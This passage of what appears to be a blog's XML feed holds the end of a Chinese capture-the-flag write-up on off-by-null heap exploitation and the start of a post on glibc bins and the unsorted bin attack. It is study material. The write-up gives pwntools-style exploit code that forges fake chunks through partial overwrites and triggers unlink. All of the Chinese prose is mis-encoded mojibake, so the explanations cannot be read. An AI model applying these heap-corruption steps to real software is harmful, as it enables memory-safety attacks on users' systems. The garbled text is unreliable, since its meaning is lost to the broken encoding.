id="1-åœ¨-fd-å’Œ-bk-å†™å †åœ°å€"><a href="#1-åœ¨-fd-å’Œ-bk-å†™å †åœ°å€" class="headerlink" title="1. åœ¨ fd å’Œ bk å†™å †åœ°å€"></a>1. åœ¨ fd å’Œ bk å†™å †åœ°å€</h5><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå †å— 0x55555555bc00 æ˜¯æˆ‘ä»¬è¦ç”¨äºæ„é€ çš„å †å—åœ°å€ã€‚</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/4d011f51c99d6a925d5ee5c25aabdadd.png" alt="å›¾ç‰‡"></p><p>é€šè¿‡ unsorted bin é“¾è¡¨æˆ‘ä»¬è®©è¿™ä¸ªå †å—çš„ fd å’Œ bk éƒ½å†™äº†ä¸€ä¸ªå †åœ°å€</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/dbe25454747c3469ac4c83297c0536c6.png" alt="å›¾ç‰‡"></p><h6 id="æ„é€ å›¾ï¼š"><a href="#æ„é€ å›¾ï¼š" class="headerlink" title="æ„é€ å›¾ï¼š"></a>æ„é€ å›¾ï¼š</h6><p><img src="/2021/07/20/2021-07-26-offbyone&null/c4c7f62c37e418f3d4fc252601150155.png" alt="å›¾ç‰‡"></p><p>å…¶ä¸­è¾…åŠ©å †å—çš„ä½œç”¨åœ¨ä¹‹åä¼šæåŠ</p><h6 id="æ„é€ ä»£ç ï¼š"><a href="#æ„é€ ä»£ç ï¼š" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a><strong>æ„é€ ä»£ç ï¼š</strong></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#0 fd</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment"># 5 bk </span><br>add(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 6</span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="2-åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—"><a href="#2-åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—" class="headerlink" title="2. åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—"></a>2. åœ¨ä¼ªé€ å †å—é™„è¿‘ç”³è¯·å †å—</h3><p>ç”±äºæˆ‘ä»¬è¦é€šè¿‡éƒ¨åˆ†å†™å…¥çš„æ–¹æ³•æ¥ç»•è¿‡æ£€æµ‹ï¼Œè€Œåœ¨å †ç©ºé—´ä¸­ï¼Œåªæœ‰ä½ä¸‰å­—èŠ‚æ˜¯å›ºå®šçš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬ä¸ºäº†é€ƒé¿çˆ†ç ´ï¼Œå¸Œæœ›èƒ½å¤Ÿæ‰¾åˆ°åªéœ€è¦è¦†ç›–æœ€ä½ä¸€å­—èŠ‚å°±å¯ä»¥ä¿®æ”¹æˆ fake chunk çš„åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬åº”è¯¥åˆ©ç”¨åœ¨ fake å †å—é™„è¿‘ 0x100 å†…çš„å †å—æ¥ä½œä¸ºè¾…åŠ©å †å—å†™åœ°å€ï¼Œ<strong>ä¹‹å‰ç”³è¯·çš„è¾…åŠ©å †å—å°±æ˜¯èµ·åˆ°äº†è¿™ä¸ªä½œç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå †å—æ¥è¿›è¡Œé‡åˆ†é…ï¼Œä½¿å¾—åˆ†é…çš„åœ°å€éå¸¸è´´è¿‘åˆ©ç”¨å †å—</strong>ã€‚</p><h4 id="æ„é€ å›¾ï¼š-1"><a href="#æ„é€ å›¾ï¼š-1" class="headerlink" title="æ„é€ å›¾ï¼š"></a>æ„é€ å›¾ï¼š</h4><p><img src="/2021/07/20/2021-07-26-offbyone&null/8940fc1f7a2579bed0c78b865df9a6c9.png" alt="å›¾ç‰‡"></p><p>å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬å…ˆè®©è¾…åŠ©å †å—å’Œåˆ©ç”¨å †å—åˆå¹¶ä¹‹åå†å¯¹ç©ºé—´è¿›è¡Œé‡æ–°åˆ†é…ï¼Œä½¿å¾—å †å— 2 æ°å¥½å¯ä»¥è¦†ç›–åˆ°ä¹‹å‰åˆ©ç”¨å †å—çš„ sizeï¼Œä¸”å †å— 3 çš„ 0x55555555bc20ï¼Œååˆ†è´´è¿‘ä¹‹å‰ 0x55555555bc00ï¼Œåªéœ€è¦æŠ¹å»æœ€ä½ä¸€å­—èŠ‚å³å¯ã€‚</p><h4 id="æ„é€ ä»£ç ï¼š-1"><a href="#æ„é€ ä»£ç ï¼š-1" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a>æ„é€ ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2 &amp; 3 unlink</span><br>add(<span class="hljs-number">0x438</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x418</span> + p64(<span class="hljs-number">0xA91</span>))  <span class="hljs-comment"># 0 set size</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 2 c20</span><br>add(<span class="hljs-number">0x428</span>)  <span class="hljs-comment"># 3 bk 150</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 fd 2b0</span><br></code></pre></td></tr></table></figure><h4 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h4><p>åˆ†é…å®Œæˆä¹‹åï¼Œæˆ‘ä»¬å†æŠŠå…¨éƒ¨å †å—ç”³è¯·å›æ¥ï¼Œè¿™å¯èƒ½å¹¶ä¸æ˜¯æ­¥éª¤æœ€å°‘çš„åšæ³•ï¼Œä½†æ˜¯å…¨éƒ¨ç”³è¯·å›æ¥å¯ä»¥ä½¿å¾—æ“ä½œæœ‰æ¡ç†ï¼Œä½¿å¾—æˆ‘ä»¬æ„é€ è¿‡ç¨‹ä¸­å‡ºç°çš„é—®é¢˜å‡å°‘ã€‚</p><h3 id="3-ä¿®å¤-fake-fd"><a href="#3-ä¿®å¤-fake-fd" class="headerlink" title="3. ä¿®å¤ fake fd"></a>3. ä¿®å¤ fake fd</h3><h4 id="ä¿®å¤æ€è·¯ï¼š"><a href="#ä¿®å¤æ€è·¯ï¼š" class="headerlink" title="ä¿®å¤æ€è·¯ï¼š"></a>ä¿®å¤æ€è·¯ï¼š</h4><p>æˆ‘ä»¬åœ¨ä¹‹å‰çš„çŠ¶æ€ä¸‹ï¼Œå…ˆåˆ é™¤ <strong>fake-&gt;FD å †å—</strong>ï¼Œå†åˆ é™¤<strong>é‡åˆ†é…å †å— 2ï¼ˆè¾…åŠ©å †å—ï¼‰</strong>ã€‚æˆ‘ä»¬å°±å¯ä»¥åœ¨ <strong>fake-&gt;FD å †å—çš„ BK ä½ç½®</strong>å†™å…¥ä¸€ä¸ª<strong>é‡åˆ†é…å †å— 2ï¼ˆè¾…åŠ©å †å—ï¼‰</strong>çš„å€¼</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/8926f053ddc0e4cc4366e19babb9f47e.png" alt="å›¾ç‰‡"></p><p>å†ç”¨éƒ¨åˆ†å†™å…¥ä¸€å­—èŠ‚æ¥è¦†ç›–ï¼Œè¦†ç›–æˆ<strong>åˆ©ç”¨å †å—</strong>çš„æŒ‡é’ˆ</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/400f4af89ed8abec85d3e1567007d7b2.png" alt="å›¾ç‰‡"></p><p>æœ€åå†æŠŠ bc20 è¿™ä¸ªè¾…åŠ©å †å—ç”³è¯·å›æ¥ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ¬¡ä½¿ç”¨ã€‚</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/e9f7b1f6bde94a7ee9b2816e4da7ea0e.png" alt="å›¾ç‰‡"></p><h4 id="æ„é€ ä»£ç ï¼š-2"><a href="#æ„é€ ä»£ç ï¼š-2" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a>æ„é€ ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite fd -&gt; bk by unsorted bin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x418</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">9</span>)  <span class="hljs-comment"># 2 partial overwrite bk</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 5 c20</span><br></code></pre></td></tr></table></figure><h5 id="4-ä¿®å¤-fake-bk"><a href="#4-ä¿®å¤-fake-bk" class="headerlink" title="4. ä¿®å¤ fake bk"></a>4. ä¿®å¤ fake bk</h5><h6 id="ä¿®å¤æ€è·¯ï¼š-1"><a href="#ä¿®å¤æ€è·¯ï¼š-1" class="headerlink" title="ä¿®å¤æ€è·¯ï¼š"></a>ä¿®å¤æ€è·¯ï¼š</h6><p>åœ¨æˆ‘ç¤ºä¾‹çš„è¿™é“é¢˜ä¸‹ï¼Œä½¿ç”¨ unsorted bin æ¥ä¿®å¤å¦å¤– <strong>fake bk</strong> æ˜¯å¾ˆéš¾çš„ï¼Œè¿™æ˜¯å› ä¸ºè¿™é“é¢˜å¦‚æœè¦è¿› unsorted bin çš„å †å—ï¼Œsize å¤§å°è¦å¤§äºç­‰äº 0x418ï¼Œè€Œè¿™ä¸ª size æ˜¯åœ¨ largebin èŒƒå›´å†…çš„ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä½¿ç”¨ä¸åŒ size ç”³è¯·çš„æ–¹æ³•ï¼Œé”™å¼€<strong>è¾…åŠ©å †å—</strong>å»ç›´æ¥ç”³è¯· <strong>fake bk å †å—ï¼ˆå› ä¸ºå¦‚æœè¦åœ¨ fake bk-&gt;fd çš„ä½ç½®å†™å †å€¼ï¼Œé‚£ä¹ˆåœ¨éå†çš„æ—¶å€™ä¸€å®šæ˜¯å…ˆéå†åˆ°è¾…åŠ©å †å—ï¼Œæ‰€ä»¥éœ€è¦é”™å¼€è¾…åŠ©å †å—å…ˆå»ç”³è¯· fake bk å †å—ï¼Œæˆ‘æƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯ç”³è¯·ä¸€ä¸ªè¾…åŠ©å †å—æ— æ³•æä¾›çš„ size æ¥é”™å¼€ã€‚ä½†äº‹å®ä¸Šï¼Œé”™å¼€è¾…åŠ©å †å—ä¼šä½¿å¾—è¾…åŠ©å †å—è¿›å…¥ largebin ä¸­ï¼Œä»è€Œä¸åŸæ¥çš„ fake bk æ–­é“¾ï¼Œè¿™æ ·åŸæ¥å·²ç»å†™ä¸Šçš„å †åœ°å€ä¹Ÿä¸å¤å­˜åœ¨ï¼‰</strong>ï¼Œå› ä¸ºè¿™ä¸ªåŸå› æ‰€ä»¥è¿™éƒ¨åˆ†æˆ‘è¦å…ˆè®©å †å—è¿›å…¥ largebin å†ç”¨<strong>ç±»ä¼¼äºä¿®å¤ fake fd çš„æ–¹æ³•è¿›è¡Œä¿®å¤ã€‚</strong></p><p>å…ˆåˆ é™¤<strong>é‡åˆ†é…å †å— 2ï¼ˆè¾…åŠ©å †å—ï¼‰</strong>ï¼Œå†åˆ é™¤ <strong>fake-&gt;BK å †å—</strong>ï¼ˆæ³¨æ„ï¼šè¿™é‡Œå’Œä¸Šé¢é¡ºåºä¸ä¸€è‡´ï¼Œè¿™æ˜¯å› ä¸ºæƒ³è¦å†™å…¥å †å—åœ°å€çš„ä½ç½®ä¸ä¸€è‡´ï¼‰</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/7b03f181d1dbc20c0b2c7d698b6d8b38.png" alt="å›¾ç‰‡"></p><p>å†è®©å †å—è¿›å…¥åˆ° largebin ä¸­</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/0d5737399f40b84abd6d99d282c0f2c8.png" alt="å›¾ç‰‡"></p><p>å†ä½¿ç”¨éƒ¨åˆ†å†™å…¥æ¢å¤ <strong>fake bk</strong></p><p><img src="/2021/07/20/2021-07-26-offbyone&null/e39634201bd2beefba9ec4e3821920e6.png" alt="å›¾ç‰‡"></p><p>æ„é€ ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># partial overwrite bk -&gt; fd by largebin list</span><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x9F8</span>)  <span class="hljs-comment"># 3 chunk into largebin</span><br>add(<span class="hljs-number">0x428</span>, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5 partial overwrite fd</span><br>add(<span class="hljs-number">0x418</span>)  <span class="hljs-comment"># 7 c20</span><br></code></pre></td></tr></table></figure><h5 id="5-ä¼ªé€ -prev-sizeï¼Œoff-by-null-ä¿®æ”¹-size-çš„-p-æ ‡å¿—ä½"><a href="#5-ä¼ªé€ -prev-sizeï¼Œoff-by-null-ä¿®æ”¹-size-çš„-p-æ ‡å¿—ä½" class="headerlink" title="5. ä¼ªé€  prev_sizeï¼Œoff by null ä¿®æ”¹ size çš„ p æ ‡å¿—ä½"></a>5. ä¼ªé€  prev_sizeï¼Œoff by null ä¿®æ”¹ size çš„ p æ ‡å¿—ä½</h5><p>è¿™éƒ¨åˆ†å†…å®¹ä¸æ˜¯æœ¬æ–‡é‡ç‚¹æ•…ç•¥è¿‡</p><h6 id="æ„é€ ä»£ç ï¼š-3"><a href="#æ„é€ ä»£ç ï¼š-3" class="headerlink" title="æ„é€ ä»£ç ï¼š"></a>æ„é€ ä»£ç ï¼š</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># off by null</span><br>add(<span class="hljs-number">0x108</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>))  <span class="hljs-comment"># 8</span><br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0xA90</span>))<br>delete(<span class="hljs-number">3</span>)  <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä½ç‰ˆæœ¬çš„æ£€æŸ¥è¿‡å°‘çš„æ—¶ä»£å·²ç»ä¸€å»ä¸è¿”ï¼Œæ–°ç‰ˆæœ¬çš„æ£€æŸ¥å¢å¤šï¼Œä½¿å¾—åˆ©ç”¨æ‰‹æ³•ä¹Ÿéšä¹‹å¤æ‚ï¼Œä½†æœ¬è´¨éƒ½æ˜¯å †å—çš„è‰¯å¥½å¸ƒå±€ï¼Œå¯¹å„ç§biné“¾ä¸Šç”¨äºç®¡ç†è€Œä¼šæ®‹ä½™çš„åƒåœ¾æ•°æ®è¿›è¡Œåˆ©ç”¨ï¼Œä»¥åŠåœ¨æ–°ç‰ˆæœ¬ä¸‹ä¼¼ä¹æœ‰äº›è¶‹å‘äºåˆ©ç”¨ large chunk æ„é€ å †å—äº†ã€‚æœ€åå¤§ä½¬ä½¿ç”¨çš„å¸ƒç½®æ€æƒ³ååˆ†å€¼å¾—æˆ‘è¿™ä¸ªå°èœé¸¡æ·±åˆ»å­¦ä¹ ç†è§£ï¼Œä¸ºäº†é¿å…çˆ†ç ´è€Œæ„é€ å‡ºåç§»åœ¨0x100å†…çš„å †å—ï¼Œè†œæ‹œpwnğŸ‘´</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;offbyone&quot;&gt;&lt;a href=&quot;#offbyone&quot; class=&quot;headerlink&quot; title=&quot;offbyone&quot;&gt;&lt;/a&gt;offbyone&lt;/h1&gt;&lt;h2 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>biné“¾æƒ…å†µé›†åˆ</title>
    <link href="http://example.com/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/"/>
    <id>http://example.com/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/</id>
    <published>2021-07-16T12:17:24.000Z</published>
    <updated>2021-10-13T08:01:21.155Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154252123-1627363406388.png" alt="image-20210720154252123"></p><h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><h3 id="åŸºæœ¬ç»“æ„"><a href="#åŸºæœ¬ç»“æ„" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><ul><li><p>å¤§å°èŒƒå›´ï¼š0x20 - 0x80</p></li><li><p>å•é“¾è¡¨ç»“æ„ï¼Œåªæœ‰fdæŒ‡é’ˆ</p></li><li><p>FILOï¼ˆæœ€åä¸€ä¸ªè¿›å…¥fastbiné“¾è¡¨çš„ï¼Œä¼šè¢«æ”¾åœ¨å¤´éƒ¨ï¼‰<br>æ€»å…±æœ‰åä¸ªfastbiné“¾è¡¨ï¼Œæ¯ä¸ªé“¾è¡¨ä¸­fastbinçš„sizeä¸€æ ·ï¼Œ0x10é€’å¢<br>å¤§å°å±äºfastbinçš„chunkè¢«freeæ‰æ—¶ï¼Œä¸ä¼šæ”¹å˜nextchunkçš„previnuseä½ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ä¼šè¢«åˆå¹¶ã€‚</p></li></ul><p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720154343954-1627363410633.png" alt="image-20210720154343954"></p><h3 id="æ£€æŸ¥"><a href="#æ£€æŸ¥" class="headerlink" title="æ£€æŸ¥"></a>æ£€æŸ¥</h3><ul><li>è¢«é‡Šæ”¾çš„å †å—çš„fdæŒ‡é’ˆä¸èƒ½æŒ‡å‘è‡ªå·±ï¼ˆè¿™ä¹Ÿå°±æ˜¯æƒ³è¦double freeçš„æ—¶å€™ï¼Œè¿˜éœ€è¦ä¸€ä¸ªä¸­é—´chunkçš„åŸå› ï¼‰</li><li>å°†fastbiné‡Œé¢çš„chunkåˆ†é…å‡ºå»æ—¶ï¼Œä¼šæ£€æŸ¥sizeä½ä¼šä¸ä¼šåŒ¹é…chunkçš„å¤§å°ï¼Œä¼šæ‰èƒ½åˆ†é…</li></ul><h3 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>æ„é€ ä¸¤ä¸ªç›¸åŒ size çš„å †å— a å’Œ bï¼Œæˆ‘ä»¬å…ˆ free (a) è®©ä»–è¿›å…¥åˆ° fast bin ä¸­ï¼Œå† free (b) ä¹Ÿè®©ä»–è¿›å…¥åˆ° fast binä¸­ã€‚è¿™æ—¶å€™ï¼Œåœ¨å †å— b çš„ fd ä½ç½®å°±å­˜åœ¨ç€å †å— a çš„åœ°å€ï¼Œæˆ‘ä»¬ leak å‡ºæ¥å°±èƒ½å¤Ÿå¾—åˆ°å †åœ°å€</p><h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><h3 id="åŸºæœ¬ç»“æ„-1"><a href="#åŸºæœ¬ç»“æ„-1" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256-1627266738935.png" style="zoom:80%;"><ul><li><p>åªæœ‰ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå­˜åœ¨fdå’ŒbkæŒ‡é’ˆ</p></li><li><p>åœ¨unsorted binä¸­ï¼Œå¯¹chunkçš„å¤§å°å¹¶æ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•å¤§å°çš„chunkï¼ˆæœªè¢«å½’ç±»ï¼‰éƒ½å¯ä»¥å½’å±åˆ°unsorted binä¸­ï¼Œä¸´æ—¶å­˜å‚¨ç”¨</p></li><li><p>unsortedbiné‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</p></li><li><p>chunkè¢«é‡Šæ”¾è¿›å…¥unsortedbinæ—¶ï¼Œfdbkå­—æ®µä¼šç•™ä¸‹ä¸€ä¸ªmain_arenaçš„åœ°å€ä¿¡æ¯</p></li></ul><h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>libc-2.29.soä»¥ä¸‹ï¼š</p><p>åˆ©ç”¨å‰ææ˜¯å…ˆæœ‰UAFï¼Œä¿®æ”¹unsortedbinä¸­çš„FDå­—æ®µä¸º0ï¼ŒBKå­—æ®µä¸ºtarget addr - 0x10ï¼Œç„¶åmallocä¸€ä¸ªç›¸åŒå¤§å°çš„chunkï¼Œå³å¯å®Œæˆæ”»å‡»ï¼Œåœ¨ç›®æ ‡åœ°å€å†™å…¥unsorted binçš„åœ°å€ï¼Œä¸€èˆ¬ç”¨æ¥ä¼ªé€ å †å¤´ï¼ˆåˆ¶é€ å‡º0x7fï¼‰ã€ä¿®æ”¹æ¬¡æ•°é™åˆ¶ã€ä¸Šé™ä¿¡æ¯ã€é…åˆå±€éƒ¨å†™</p><h3 id="å°æŠ€å·§-1"><a href="#å°æŠ€å·§-1" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>å½“ unsorted bin é“¾ä¸Šæœ‰ä¸¤ä¸ªå †å—çš„æ—¶å€™ï¼Œå…¶ä¸­ä¸€ä¸ªå †å—çš„ fd ä¼šæŒ‡å‘å¦ä¸€ä¸ªå †å—ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ leak å¾—åˆ°ï¼Œå¯è®¡ç®—å‡ºå †åŸºå€</p><h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h3 id="åŸºæœ¬ç»“æ„-2"><a href="#åŸºæœ¬ç»“æ„-2" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103140256.png" alt="image-20210726103140256" style="zoom:80%;"><ul><li>å¤§å°èŒƒå›´ï¼š0x90 - 0x400</li><li>ç”±62ä¸ªåŒå‘é“¾è¡¨ç»„æˆï¼Œæ¯ä¸ªé“¾è¡¨ä¸­çš„chunkå¤§å°ä¸€æ ·ï¼Œå¤§å°ä»¥0x10é€’å¢ï¼Œå­˜åœ¨fdå’ŒbkæŒ‡é’ˆ</li><li>ç›¸é‚»çš„free chunkä¼šè§¦å‘åˆå¹¶æ“ä½œï¼Œå³åˆå¹¶æˆä¸€ä¸ªå¤§çš„free chunk</li><li>é‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</li></ul><h3 id="å°æŠ€å·§-2"><a href="#å°æŠ€å·§-2" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>small bin ä¸­å­˜åœ¨ä¸¤ä¸ªå—æ—¶ï¼Œç¬¬ä¸€ä¸ªå—çš„fdæŒ‡é’ˆæŒ‡å‘main_arenaï¼ŒbkæŒ‡é’ˆæŒ‡å‘äº†ä¸‹ä¸€ä¸ªå †å—ï¼Œæ‰€ä»¥å¯ä»¥æ³„éœ²å‡ºlibcä»¥åŠå †åœ°å€</p><h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h3 id="åŸºæœ¬ç»“æ„-3"><a href="#åŸºæœ¬ç»“æ„-3" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210720153655147.png" alt="image-20210720153655147" style="zoom:80%;"><p><img src="/2021/07/16/2021-07-23-bin%E9%93%BE%E6%83%85%E5%86%B5%E5%90%88%E9%9B%86/image-20210726103541056-1627363427270.png" alt="image-20210726103541056"></p><ul><li>å¤§å°èŒƒå›´ï¼š0x410 ä»¥ä¸Š</li><li>63ä¸ªåŒå‘é“¾è¡¨ï¼Œä¸ä»…å­˜åœ¨fdå’ŒbkæŒ‡é’ˆï¼ŒåŒæ—¶è¿˜æœ‰fd nextsize å’Œ bk nextsize</li><li>åŒä¸€ä¸ªåŒå‘é“¾è¡¨ä¸­chunkå¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œä½†æ˜¯åœ¨ä¸€å®šèŒƒå›´å†…ï¼Œbinså¤§å°ä»å°åˆ°å¤§æ’åˆ—</li><li>ç›¸é‚»çš„free chunkä¼šè§¦å‘åˆå¹¶æ“ä½œï¼Œå³åˆå¹¶æˆä¸€ä¸ªå¤§çš„free chunk</li><li>é‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO</li><li><strong>åœ¨è¿™63ä¸ªlargebinsä¸­ï¼šç¬¬ä¸€ç»„çš„32ä¸ªlargebiné“¾</strong>ä¾æ¬¡ä»¥64å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼Œå³ç¬¬ä¸€ä¸ªlargebiné“¾ä¸­chunksizeä¸º1024-1087å­—èŠ‚ï¼Œç¬¬äºŒä¸ªlarge binä¸­chunk sizeä¸º1088~1151å­—èŠ‚ã€‚<strong>ç¬¬äºŒç»„çš„16ä¸ªlargebiné“¾</strong>ä¾æ¬¡ä»¥512å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼›<strong>ç¬¬ä¸‰ç»„çš„8ä¸ªlargebiné“¾</strong>ä»¥æ­¥é•¿4096ä¸ºé—´éš”ï¼›<strong>ç¬¬å››ç»„çš„4ä¸ªlargebiné“¾</strong>ä»¥32768å­—èŠ‚ä¸ºé—´éš”ï¼›<strong>ç¬¬äº”ç»„çš„2ä¸ªlargebiné“¾</strong>ä»¥262144å­—èŠ‚ä¸ºé—´éš”ï¼›<strong>æœ€åä¸€ç»„</strong>çš„largebiné“¾ä¸­çš„chunkå¤§å°æ— é™åˆ¶ã€‚</li></ul><h3 id="å°æŠ€å·§-3"><a href="#å°æŠ€å·§-3" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h3><p>å¦‚æœå †å—åœ¨ largebin ä¸­ï¼Œä»–çš„ <strong>fd_nextsize</strong> å’Œ <strong>bk_nextsize</strong> éƒ½ä¼šæŒ‡å‘å †å—åœ°å€ï¼Œå¯ä»¥æ³„éœ²å‡ºå †åœ°å€</p><p>å¦‚æœlargenbinä¸Šä»…æœ‰ä¸€ä¸ªå †å—ï¼Œé‚£è¯¥å †å—çš„fd_nextsizeå’Œbk_nextsizeæŒ‡å‘è‡ªèº«</p><h1 id="mallocè¿‡ç¨‹"><a href="#mallocè¿‡ç¨‹" class="headerlink" title="mallocè¿‡ç¨‹"></a>mallocè¿‡ç¨‹</h1><ul><li><p>è®¡ç®—çœŸæ­£å †å—å¤§å°ï¼ˆåŠ 